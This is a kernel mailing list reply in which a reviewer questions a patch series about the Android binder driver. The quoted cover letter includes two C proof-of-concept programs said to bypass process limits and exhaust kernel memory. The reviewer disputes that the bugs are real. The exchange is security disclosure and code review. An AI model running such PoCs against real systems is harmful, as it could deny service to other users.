Received: from mail-wm1-f51.google.com (mail-wm1-f51.google.com [209.85.128.51])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id CF832481236
	for <rust-for-linux@vger.kernel.org>; Wed,  3 Jun 2026 18:57:47 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.128.51
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1780513069; cv=pass; b=hHnyM8GGP/UalHox/WlcD9Tbd4gnCGgk7BSWzYm3IER9Z4w1x/eIvbopvr4iGq2LxOpzC04dA8clM2MkCCySWdgWr1DTcgSQgzL25NSKg2G/hPLtYCiayOV7MrvrdOLStOT7wfhk9eiLowVHjmAeqYbxlM2rZ47aDBPKuKLuk3s=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1780513069; c=relaxed/simple;
	bh=K/L6jOByg4owqAoGcNWnWviygAYGy/IGeIScedyc2Ks=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=JTDgxfeVqNb1/83oHWWAj6uCLQe/I/LcxSnFs5WrHQF6v0IjNc/FgUlBrBgz1ceVjaMKUkcxVdC6GeZJHm9w8NTu1Q0YS9w7busNWBnBJ8GPWdTHiyct4n2ORbf2fL6ngDTpcimbkdJXxOASknelA0U4rXZRv0YwG5Sr0R2QSr4=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=google.com; spf=pass smtp.mailfrom=google.com; dkim=pass (2048-bit key) header.d=google.com header.i=@google.com header.b=jPhQiMY1; arc=pass smtp.client-ip=209.85.128.51
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=google.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=google.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=google.com header.i=@google.com header.b="jPhQiMY1"
Received: by mail-wm1-f51.google.com with SMTP id 5b1f17b1804b1-490ace40f4bso43015585e9.3
        for <rust-for-linux@vger.kernel.org>; Wed, 03 Jun 2026 11:57:47 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1780513066; cv=none;
        d=google.com; s=arc-20240605;
        b=VqYmi3KMDtxB37rDX0OHeqYZI1cpANEMAuiJX3JpTx2V1zuD0kIoxRS9Fnu77tNMdn
         8dtigXfda55iktIkm30IUDLvKqUQyowTSvT/zP+5nkLF045RccdUSQr+KdwDprXRUFl8
         j0By02aKBb41NBSdkZXJeYSPVauebu0hDGT6ejgHa0XUFcZwMl/Tp7FH0G/8vf30eZ2v
         BqszfmrKZOTNRnNYb270coYQ2hGuJtEMpjY1VnaVr8EDE86sw8jvZ3/QHGidWByrMZG3
         QT7PWFK3//stAYYgldl6pEPMZvtLetA10WRxAdzlo93iZa1vzPwu06UP34MfeTgWo1ES
         Iy5A==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=IyCAt36jiSDjjNjwgSX3Kr2w91oAoFpMzIzWOWRUVJA=;
        fh=4L49pt+zUN7/X14DeYmc7vh7yN0lPuH5K6F3HjGEinc=;
        b=eUC3LPvHBLNfHuDgyRm65dt257m1DVT4iCrqPD8FreUTmZoxA+dH1NF1Vbq62OOa4Q
         xQ24p6eLDQ+5tHUd4N1XaPrPKajw7f+icmIfSj7N4CVAQ1isf8YjGp/W4jngtkV7UyQR
         90A5T4Jo6yrsU0GbYjrVIr8a2L33T1z0TAPaExAQBwOfYRRA+aoQO8ewSf/qw7RrAaB5
         3pMGplLmBJZG7cFeaJNSUj4SunzxRyuSNFNPkb18kvXhh8vEVGXxgDtS7g2FetSgTHK7
         we0X//F1w6cIoczI/L7vLH59G+glWU76/Gop5f0/X2DJxasfa0s2ztw9SfGu73KCzWjW
         DXRQ==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20251104; t=1780513066; x=1781117866; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=IyCAt36jiSDjjNjwgSX3Kr2w91oAoFpMzIzWOWRUVJA=;
        b=jPhQiMY1yd3NgokdLxyeOng8ydwr0Qnl+43RgBudQsetNkD3oh8TdSzZHw6H1sN34F
         fQ1nY6RhPLqmnDqLg+UhGK5fhHWDV0tyTfRmb2fE1A7tOcUDqoaZDD5ycbTf03SCaa5z
         oKoV7D6d1hVlWOrQw/KEK7fHCyLc9NvzXpgKZHk3v+zmISDXwXOxVSEU1WSFbnrR7WMI
         CJmTzKP8y0zWohscy5l95czs4jUpSsYcUzSJbatD2rJckokhD4WWq4HTEj+UudTZMZY0
         WNHpemlIL475lje2KBv6802wh0ABvg3IzdBCkKzQ12YYCogqMEsD8mSDREKsuhan7IAz
         EdoQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1780513066; x=1781117866;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=IyCAt36jiSDjjNjwgSX3Kr2w91oAoFpMzIzWOWRUVJA=;
        b=eopqxS8XBkvbfA+61s9l2gBoVSp3Q2mouvQYXomcrgG95F5DrvvqxIUlSawIR6KPL8
         xGeSGDOjLsxeDaP8ODiHaIMV/E0QYeJ1IUur75jnacUJHM1+36cMySsnfmO95fd+1bH8
         bTN6WrmP5h1vrSzNZWRxLhLsygGJV3omIg6LTwypsZP4XK9jYs5YwfW3SUa0X8dWpMyE
         51eCjo+4or33cY2YER1ChExmOP0um0rx3gbDDN/PwUmUTUvIra08NomAwNyWVLuLfuaE
         /sB1ohiT/SjAevoP5RaxJecQhDqqXMPiD/zCuhuRTpHedC1gWtjYO6CmCXuglAgesdVC
         hs2g==
X-Forwarded-Encrypted: i=1; AFNElJ+8fTueK8xNogXoW4aNsocPOHTM2EXvZdWniueGvIz8B972WN/aRjY1NvIoy1fsXWSHBMIVPwMr62DBJ/uiaA==@vger.kernel.org
X-Gm-Message-State: AOJu0YxhvD10H9j5D3S7RT0M6NKh47+JED0UQqDOgv8/CUN9BaPRtBW8
	w+i+ki1CWoyNtE7gTMzmHO8vMkqP6k9/EYVUHXU+SNuKPNo4H0H7ID42s4wDNEDbVS50DQfZh82
	GK6AuKdK0zZObI8w2RrrTqECkjtQ7hGcX0MgtFeFg
X-Gm-Gg: Acq92OHftP3F8uGivJUpcCxady6ELanpRAjLlCl8/k1eNgwkVh+bDuiDeERCENqae62
	twJIHaqpZXwMhKIMyjkawB/TMGA8CKyrOHMi/j+QoyW4OBTOl/fB1EFi7RhdrAya5R8gJtzMiTm
	z2LA1JbIy0PT/DWRog20fGK7+9kHHAph0uTYa2HqfPHKBHf0fguMrsMCUZE7O5y93frgseKh1j/
	fRH8TmhIJk2cX5/mkuOChWeKO/W3hx0vcJhyRNt6YxcMInA6JHWflQIEGih+WFIyJed+DQDln5o
	QRf1Hopax47Y53FU6BI+AotKfFhaTXYTHP59ud6Hu4Fi9TCF
X-Received: by 2002:a05:600c:8887:b0:490:b629:286c with SMTP id
 5b1f17b1804b1-490b62928d0mr57194495e9.12.1780513063897; Wed, 03 Jun 2026
 11:57:43 -0700 (PDT)
Precedence: bulk
X-Mailing-List: rust-for-linux@vger.kernel.org
List-Id: <rust-for-linux.vger.kernel.org>
List-Subscribe: <mailto:rust-for-linux+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:rust-for-linux+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20260603-b4-binder-hardening-v1-0-d0aae3556c9b@est.tech>
In-Reply-To: <20260603-b4-binder-hardening-v1-0-d0aae3556c9b@est.tech>
From: Alice Ryhl <aliceryhl@google.com>
Date: Wed, 3 Jun 2026 20:57:31 +0200
X-Gm-Features: AVHnY4JMschiqpGM7WdCd_fPuhtGXZ3BlByggpz3nMDmfDi6U10BoqeCGlYJjqk
Message-ID: <CAH5fLgh664qa63CBqWY1CVNkdMwJbOPNzzPawpm8Ctz4U219gw@mail.gmail.com>
Subject: Re: [PATCH 0/4] binder: cap max_threads and reject duplicate looper entry
To: Yunseong Kim <yunseong.kim@est.tech>
Cc: Greg Kroah-Hartman <gregkh@linuxfoundation.org>, =?UTF-8?B?QXJ2ZSBIasO4bm5ldsOlZw==?= <arve@android.com>, 
	Todd Kjos <tkjos@android.com>, Christian Brauner <brauner@kernel.org>, 
	Carlos Llamas <cmllamas@google.com>, Brian Swetland <swetland@google.com>, 
	Miguel Ojeda <ojeda@kernel.org>, Boqun Feng <boqun@kernel.org>, Gary Guo <gary@garyguo.net>, 
	=?UTF-8?Q?Bj=C3=B6rn_Roy_Baron?= <bjorn3_gh@protonmail.com>, 
	Benno Lossin <lossin@kernel.org>, Andreas Hindborg <a.hindborg@kernel.org>, 
	Trevor Gross <tmgross@umich.edu>, Danilo Krummrich <dakr@kernel.org>, Greg Kroah-Hartman <gregkh@suse.de>, 
	linux-kernel@vger.kernel.org, rust-for-linux@vger.kernel.org, 
	Yunseong Kim <ysk@kzalloc.com>
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

On Wed, Jun 3, 2026 at 8:02=E2=80=AFPM Yunseong Kim <yunseong.kim@est.tech>=
 wrote:
>
> Two logic bugs in the Android binder driver (both C and Rust implementati=
ons)
> allow an unprivileged userspace process to bypass RLIMIT_NPROC and exhaus=
t
> kernel memory, leading to system-wide denial of service.
>
> Bug 1: BINDER_SET_MAX_THREADS has no upper bound check
> Bug 2: BC_ENTER_LOOPER accepts duplicates without error
>
> These were discovered using kcov-dataflow [1], a per-task function bounda=
ry
> extraction tool that captures argument values at -O2 where other tools
> (KASAN, ftrace, edge coverage) cannot detect logic errors.
>
> [1] https://github.com/yskzalloc/kcov-dataflow
> [2] https://lore.kernel.org/all/20260603-kcov-dataflow-next-20260603-v2-0=
-fee0939de2c4@est.tech/
> [3] https://github.com/llvm/llvm-project/pull/201410
>
> --- Userspace PoC (To-Ulimit-and-Beyond.c) ---
>
> /*
>  * To-Ulimit-and-Beyond: Demonstrates both bugs from unprivileged userspa=
ce.
>  * Build: gcc -static -o To-Ulimit-and-Beyond To-Ulimit-and-Beyond.c
>  * Run:   ulimit -u 50; ./To-Ulimit-and-Beyond
>  *
>  * Expected (before fix):
>  *   VULNERABLE: kernel accepted max_threads=3D4294967295!
>  *   VULNERABLE: duplicate BC_ENTER_LOOPER accepted!
>  *
>  * Expected (after fix):
>  *   PATCHED: kernel rejected the value
>  *   (second BC_ENTER_LOOPER marks thread INVALID internally)
>  */
>
> struct binder_write_read {
>     int64_t write_size, write_consumed;
>     uint64_t write_buffer;
>     int64_t read_size, read_consumed;
>     uint64_t read_buffer;
> };
>
> int main(void)
> {
>     int fd =3D open("/dev/binderfs/binder", O_RDWR);
>     if (fd < 0) fd =3D open("/dev/binder", O_RDWR);
>     if (fd < 0) { perror("open binder"); return 1; }
>     mmap(NULL, 128*1024, PROT_READ, MAP_PRIVATE, fd, 0);
>
>     printf("pid=3D%d uid=3D%d\n", getpid(), getuid());
>
>     /* Bug 1: SET_MAX_THREADS with no upper bound */
>     uint32_t max =3D 0xFFFFFFFF;
>     int ret =3D ioctl(fd, BINDER_SET_MAX_THREADS, &max);
>     printf("[Bug 1] SET_MAX_THREADS=3D0xFFFFFFFF: %s (errno=3D%d)\n",
>            ret =3D=3D 0 ? "VULNERABLE" : "PATCHED", ret < 0 ? errno : 0);
>
>     /* Bug 2: BC_ENTER_LOOPER duplicate */
>     uint32_t cmd =3D BC_ENTER_LOOPER;
>     struct binder_write_read bwr =3D {
>         .write_size =3D sizeof(cmd),
>         .write_buffer =3D (uint64_t)(unsigned long)&cmd,
>     };
>     ioctl(fd, BINDER_WRITE_READ, &bwr);
>     bwr.write_consumed =3D 0;
>     ret =3D ioctl(fd, BINDER_WRITE_READ, &bwr);
>     printf("[Bug 2] BC_ENTER_LOOPER x2: ret=3D%d (thread now INVALID if p=
atched)\n", ret);
>
>     close(fd);
>     return 0;
> }

So invoking BC_ENTER_LOOPER twice doesn't error and the second call is
a no-op. What's the problem?

> --- ulimit bypass PoC (beyond_ulimit.c) ---
>
> /*
>  * Demonstrates RLIMIT_NPROC bypass via binder.
>  * With ulimit -u 50, creates 300 threads.
>  * Build: gcc -static -pthread -o beyond_ulimit beyond_ulimit.c
>  * Run:   ulimit -u 50; ./beyond_ulimit
>  */
>
> struct binder_write_read {
>     int64_t write_size, write_consumed;
>     uint64_t write_buffer;
>     int64_t read_size, read_consumed;
>     uint64_t read_buffer;
> };
>
> static void *binder_thread(void *arg)
> {
>     int fd =3D open("/dev/binderfs/binder", O_RDWR);
>     if (fd < 0) fd =3D open("/dev/binder", O_RDWR);
>     if (fd < 0) return NULL;
>     mmap(NULL, 128*1024, PROT_READ, MAP_PRIVATE, fd, 0);
>     uint32_t max =3D 0xFFFFFFFF;
>     ioctl(fd, BINDER_SET_MAX_THREADS, &max);
>     uint32_t cmd =3D BC_REGISTER_LOOPER;
>     struct binder_write_read bwr =3D {
>         .write_size =3D sizeof(cmd),
>         .write_buffer =3D (uint64_t)(unsigned long)&cmd,
>     };
>     ioctl(fd, BINDER_WRITE_READ, &bwr);
>     close(fd);
>     return NULL;
> }
>
> int main(void)
> {
>     printf("pid=3D%d uid=3D%d\n", getpid(), getuid());
>     int created =3D 0;
>     pthread_attr_t attr;
>     pthread_attr_init(&attr);
>     pthread_attr_setstacksize(&attr, 16384);
>     for (int i =3D 0; i < 300; i++) {
>         pthread_t t;
>         if (pthread_create(&t, &attr, binder_thread, NULL)) break;
>         pthread_detach(t);
>         created++;
>     }
>     usleep(500000);
>     printf("Threads created: %d (ulimit was 50)\n", created);
>     if (created > 50)
>         printf("VULNERABLE: RLIMIT_NPROC bypassed!\n");
>     return 0;
> }

My understanding is that the only thing BINDER_SET_MAX_THREADS does is
cause the kernel to tell userspace "please spawn more threads" when
all threads are in use and there are incoming transactions. I don't
understand how it helps by pass ulimit. Did you try running your test
with the Binder ioctl removed? I'd guess that if it passes now, it
still passes with the Binder ioctl deleted.

Alice
